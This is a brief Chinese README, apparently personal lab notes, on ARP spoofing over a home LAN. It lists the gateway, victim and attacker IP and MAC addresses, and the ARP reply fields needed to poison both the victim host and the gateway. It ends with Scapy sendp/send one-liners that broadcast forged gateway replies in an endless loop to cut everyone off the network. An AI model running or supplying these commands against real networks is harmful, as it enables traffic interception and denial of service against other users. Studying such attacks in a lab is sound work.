# Network-Protocols-attack-arp

网关ip （192.168.1.1）

网关MAC （f4:83:cd:96:3d:78）      

受害者ip（192.168.1.102）

受害者MAC（d0:17:c2:17:ed:c8）

攻击者IP（192.168.1.128）

攻击者MAC（00:0c:29:c5:f2:44）

欺骗主机

hwdst=d0:17:c2:17:ed:c8 （发给102MAC）

hwsrc=00:0c:29:c5:f2:44 （假冒MAC）

op=2               

psrc=192.168.1.1        （假冒ip） 

pdst=192.168.1.102      （发给102）



欺骗网关

hwdst='f4:83:cd:96:3d:78' （发给网关MAC）

hwsrc='00:0c:29:c5:f2:44' （假冒MAC）

op=2

psrc='192.168.1.102'       (假冒ip)

pdst='192.168.1.1'        （发给网关）



广播让所有人断网

hwdst='ff:ff:ff:ff:ff:ff'

hwsrc='00:11:22:33:44:55'

op=2

psrc='192.168.1.1'

sendp(ARP(hwdst='ff:ff:ff:ff:ff:ff',hwsrc='00:11:22:33:44:55',psrc='192.168.1.1',op=2)，loop=1)

sendp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(hwsrc='00:11:22:33:44:55',psrc='192.168.1.1',op=2),loop=1)

##出现报错

sendp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(hwsrc='00:11:22:33:44:55',psrc='192.168.1.1',op=2),loop=1)

send(ARP(hwdst='ff:ff:ff:ff:ff:ff',hwsrc='00:11:22:33:44:55',psrc='192.168.1.1',op=2),loop=1)
